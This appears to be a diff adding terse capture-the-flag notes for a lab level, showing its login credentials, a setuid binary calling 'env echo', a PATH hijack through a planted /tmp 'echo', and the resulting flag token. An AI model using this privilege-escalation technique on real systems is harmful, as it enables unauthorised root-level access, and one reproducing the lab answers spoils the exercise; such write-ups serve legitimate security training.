@@ -1,0 +1,16 @@
+- Connect with login: "level03" and password: "kooda2puivaav1idi4f57q8iq"
+- run level03
+	Exploit me
+- ls -l
+	total 12
+	-rwsr-sr-x 1 flag03 level03 8627 Mar  5  2016 level03
+- got setuid
+- ltrace ./level03
+	system("/usr/bin/env echo Exploit me")
+- need to replace command echo by changing PATH in env
+- find / -writable -type d 2>/dev/null
+	/tmp
+- export PATH=/tmp:$PATH
+- scp -P 4242 echo level03@192.168.1.?:/tmp
+- run level03
+	qi0maab88jeaj46qoumi7maus
